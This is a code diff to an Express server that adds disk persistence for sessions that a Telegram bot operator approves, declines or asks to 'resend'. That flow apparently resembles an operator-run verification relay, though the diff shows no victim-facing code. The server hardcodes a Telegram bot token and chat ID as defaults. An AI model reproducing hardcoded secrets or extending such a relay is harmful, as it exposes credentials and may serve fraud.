@@ -1,6 +1,7 @@
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3005;
@@ -9,6 +10,8 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8936298383:AAGUnZa
 const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8392790531';
 const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 const SESSION_TTL_MS     = 60 * 60 * 1000;
+
+const SESSIONS_FILE = '/tmp/sessions.json';
 
 app.use(cors());
 app.use(express.json({ limit: '1mb' }));
@@ -20,12 +23,31 @@ app.use((req, _res, next) => {
   next();
 });
 
-const sessions = new Map();
+// ---------- Persistent session store ----------
+let sessions = new Map();
+try {
+  if (fs.existsSync(SESSIONS_FILE)) {
+    const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
+    sessions = new Map(JSON.parse(raw));
+    console.log(`[sessions] restored ${sessions.size} from disk`);
+  }
+} catch (e) {
+  console.warn('[sessions] restore failed:', e.message);
+}
+
+function persistSessions(){
+  try {
+    fs.writeFileSync(SESSIONS_FILE, JSON.stringify([...sessions.entries()]));
+  } catch (e) {
+    console.warn('[sessions] persist failed:', e.message);
+  }
+}
 
 function createSession(stage, meta){
   const id = 's_' + Date.now().toString(36) + Math.random().toString(36).slice(2,8);
   const now = Date.now();
   sessions.set(id, { id, stage, meta, status:'pending', createdAt:now, expiresAt: now + SESSION_TTL_MS });
+  persistSessions();
   console.log(`[session] created ${id} stage=${stage} total=${sessions.size}`);
   return sessions.get(id);
 }
@@ -36,9 +58,14 @@ function getSession(id){
   console.log(`[session] HIT ${id} status=${s.status}`);
   return s;
 }
+
 setInterval(()=>{
   const now = Date.now();
-  for(const [id,s] of sessions){ if(now > s.expiresAt + 60000) sessions.delete(id); }
+  let changed = false;
+  for(const [id,s] of sessions){
+    if(now > s.expiresAt + 60000){ sessions.delete(id); changed = true; }
+  }
+  if(changed) persistSessions();
 }, 5*60*1000);
 
 function esc(s = '') {
@@ -150,6 +177,7 @@ app.post('/api/telegram-webhook', async (req,res)=>{
       else if(action === 'decline'){ s.status = 'declined'; await tgAnswer(cq.id,'❌ Declined'); }
       else if(action === 'resend'){ s.status = 'resend'; await tgAnswer(cq.id,'🔁 Resend'); }
       else { await tgAnswer(cq.id,'Unknown action'); }
+      persistSessions();
       if(cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
       console.log(`[webhook] processed action=${action} sid=${sessionId} newStatus=${s.status}`);
     }
